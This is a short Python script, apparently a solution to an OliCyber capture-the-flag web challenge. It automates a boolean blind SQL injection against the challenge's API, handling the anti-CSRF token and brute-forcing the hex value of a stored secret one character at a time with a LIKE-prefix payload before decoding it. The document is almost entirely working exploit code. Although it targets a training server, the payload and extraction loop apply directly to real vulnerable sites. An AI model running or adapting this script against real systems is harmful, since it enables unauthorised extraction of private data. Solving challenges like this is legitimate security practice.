import requests
import binascii
#import time


class Inj:
    def __init__(self, host):

        self.sess = requests.Session() # Start the session. We want to save the cookies
        self.base_url = '{}/api/'.format(host)
        self._refresh_csrf_token() # Refresh the ANTI-CSRF token

    def _refresh_csrf_token(self):
        resp = self.sess.get(self.base_url + 'get_token')
        resp = resp.json()
        self.token = resp['token']

    def _do_raw_req(self, url, query):
        headers = {'X-CSRFToken': self.token}
        data = {'query': query }
        return self.sess.post(url,json=data, headers=headers).json()

    def logic(self, query):
        url = self.base_url + 'logic'
        response = self._do_raw_req(url, query)
        return response['result'], response['sql_error']

    def union(self, query):
        url = self.base_url + 'union'
        response = self._do_raw_req(url, query)
        return response['result'], response['sql_error']

    def blind(self, query):
        url = self.base_url + 'blind'
        response = self._do_raw_req(url, query)
        return response['result'], response['sql_error']

    def time(self, query):
        url = self.base_url + 'time'
        response = self._do_raw_req(url, query)
        return response['result'], response['sql_error']

if __name__ == "__main__":

    host = 'http://web-17.challs.olicyber.it'
    inj = Inj(host)

    dictionary = '0123456789abcdef'
    result = ''

    
    while True:
        found = False
        for c in dictionary:
            question = f"1' and (select 1 from secret where HEX(asecret) LIKE '{result+c}%')='1"
            response, error = inj.blind(question)

            # se l'API ritorna 'success'
            if response == 'Success':
                result += c
                print("Prefix valido:", result)
                found = True
                #time.sleep(0.1)
                break

        if not found:
            # nessun carattere del dizionario ha match
            break

    print("\nHEX output:", result)

    decoded = binascii.unhexlify(result)
    print("Decodificato (utf-8):", decoded.decode('utf-8'))
    
